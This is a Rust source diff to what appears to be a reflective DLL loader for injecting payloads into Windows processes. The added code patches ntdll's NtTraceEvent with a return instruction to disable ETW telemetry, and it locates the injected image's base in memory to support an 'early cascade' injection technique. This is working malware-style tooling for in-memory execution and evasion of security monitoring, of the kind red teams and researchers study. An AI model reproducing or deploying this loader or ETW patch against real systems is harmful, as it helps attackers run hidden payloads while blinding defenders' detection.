@@ -11,15 +11,15 @@ use core::{
     ptr::{copy_nonoverlapping, null_mut, read_unaligned, write_unaligned},
 };
 
+use shared_no_std::export_resolver::{self, find_export_address};
 use windows_sys::{
     Win32::{
         Foundation::{FARPROC, HANDLE, HMODULE},
         System::{
             Diagnostics::Debug::{
                 IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_BASERELOC,
-                IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64,
-                IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE,
-                IMAGE_SECTION_HEADER,
+                IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE,
+                IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
             },
             Memory::{
                 MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
@@ -27,17 +27,14 @@ use windows_sys::{
                 PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
             },
             SystemServices::{
-                IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
-                IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64,
-                IMAGE_REL_BASED_HIGHLOW,
+                IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR,
+                IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW,
             },
             WindowsProgramming::IMAGE_THUNK_DATA64,
         },
     },
     core::PCSTR,
 };
-
-use crate::utils::export_resolver::{self, find_export_address};
 
 //
 // FFI definitions for functions we require for the RDI to work; note these do NOT use evasion techniques such as
@@ -163,6 +160,17 @@ pub unsafe extern "system" fn Load(image_base: *mut c_void) -> u32 {
     let Some(exports) = RdiExports::new() else {
         // We could not resolve all the required function pointers
         return RdiErrorCodes::CouldNotParseExports as _;
+    };
+
+    #[cfg(feature = "patch_etw")]
+    {
+        nostd_patch_etw_current_process(&exports);
+    }
+
+    // If we successfully get an image base from ourselves, use that
+    let image_base = match calculate_image_base() {
+        Some(img) => img,
+        None => image_base,
     };
 
     //
@@ -479,6 +487,7 @@ fn get_addr_as_rva<T>(base_ptr: *mut u8, offset: usize) -> *mut T {
     (base_ptr as usize + offset) as *mut T
 }
 
+#[inline(always)]
 fn write_payload(
     new_base_ptr: *mut c_void,
     old_base_ptr: *mut u8,
@@ -517,5 +526,110 @@ fn write_payload(
             new_base_ptr as *mut u8,
             nt_headers.OptionalHeader.SizeOfHeaders as usize,
         );
+    }
+}
+
+#[inline(always)]
+fn nostd_patch_etw_current_process(exports: &RdiExports) {
+    let fn_addr = export_resolver::resolve_address("ntdll.dll", "NtTraceEvent", None)
+        .unwrap_or_default() as *mut u8;
+
+    if fn_addr.is_null() {
+        return;
+    }
+
+    let ret_opcode: u8 = 0xC3;
+
+    // Have we already patched?
+    if unsafe { *(fn_addr as *mut u8) } == 0xC3 {
+        return;
+    }
+
+    // Required for 2nd fn call
+    let mut unused_protect: u32 = 0;
+    // The protection flags to reset to
+    let mut old_protect: u32 = 0;
+
+    unsafe {
+        (exports.VirtualProtect)(
+            fn_addr as *const _,
+            1,
+            PAGE_EXECUTE_READWRITE,
+            &mut old_protect,
+        )
+    };
+    unsafe { core::ptr::write_bytes(fn_addr, ret_opcode, 1) };
+    unsafe { (exports.VirtualProtect)(fn_addr as *const _, 1, old_protect, &mut unused_protect) };
+}
+
+fn calculate_image_base() -> Option<*mut c_void> {
+    let load_addr = Load as *const () as usize;
+
+    // Round down to 64KB boundary
+    let mut current = load_addr & !0xFFFF;
+
+    for _ in 0..16 {
+        if is_valid_pe_base(current) {
+            let current = current as *mut c_void;
+            return Some(current);
+        }
+
+        current = current.wrapping_sub(0x10000); // Move back 64KB
+    }
+
+    None
+}
+
+/// Do our best to validate that the offset we found is actually the start of our injected PE.
+/// This is necessary for using early cascade as we cannot pass a parameter into the routine.
+fn is_valid_pe_base(addr: usize) -> bool {
+    unsafe {
+        let base = addr as *const u8;
+
+        let lfanew = read_unaligned(base.add(0x3C) as *const u32);
+
+        // e_lfanew should be reasonable (typically 0x80-0x200)
+        if lfanew < 0x40 || lfanew > 0x1000 {
+            return false;
+        }
+
+        // Verify PE signature at e_lfanew offset
+        let pe_sig = read_unaligned(base.add(lfanew as usize) as *const u32);
+        if pe_sig != 0x00004550 {
+            return false;
+        }
+
+        // Verify machine type (x64)
+        let machine = read_unaligned(base.add(lfanew as usize + 4) as *const u16);
+        if machine != 0x8664 {
+            return false;
+        }
+
+        // Verify optional header magic
+        let opt_magic = read_unaligned(base.add(lfanew as usize + 24) as *const u16);
+        if opt_magic != 0x020B {
+            return false;
+        }
+
+        // Verify SizeOfImage is reasonable
+        let size_of_image = read_unaligned(base.add(lfanew as usize + 24 + 56) as *const u32);
+        if size_of_image < 0x1000 || size_of_image > 0xA00000 {
+            // Between 4KB and 10MB
+            return false;
+        }
+
+        // Verify ImageBase looks like a valid address
+        let image_base_field = read_unaligned(base.add(lfanew as usize + 24 + 24) as *const u64);
+        if image_base_field == 0 {
+            return false;
+        }
+
+        // Verify the address is within SizeOfImage
+        let load_offset = (Load as *const c_void as usize).wrapping_sub(addr);
+        if load_offset > size_of_image as usize {
+            return false;
+        }
+
+        true
     }
 }
